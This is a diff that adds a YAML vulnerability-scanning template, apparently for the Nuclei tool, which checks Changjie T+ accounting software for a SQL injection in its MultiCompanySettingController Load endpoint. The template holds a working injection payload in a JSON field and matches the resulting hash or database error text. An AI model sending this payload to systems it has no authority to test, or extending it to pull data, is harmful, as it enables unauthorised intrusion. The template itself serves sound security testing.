@@ -1,0 +1,29 @@
+id: poc-yaml-changjie-tplus-load-sqli
+info:
+  name: Changjie T+ Load SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanySettingController,Ufida.T.SM.UIP.ashx?method=Load HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"currentAccId":"2' and 1=sys.fn_varbintohexstr(hashbytes('MD5', CAST('{{t1}}' AS VARCHAR)))--+", "currentAcc":"1", "currentDsName":"1", "currentVersion":"1", "currentVersionNo":"1"}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "0x{{t2}}"
+          - "Ufida.T.EAP.ErrorInfo.DatabaseException"
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
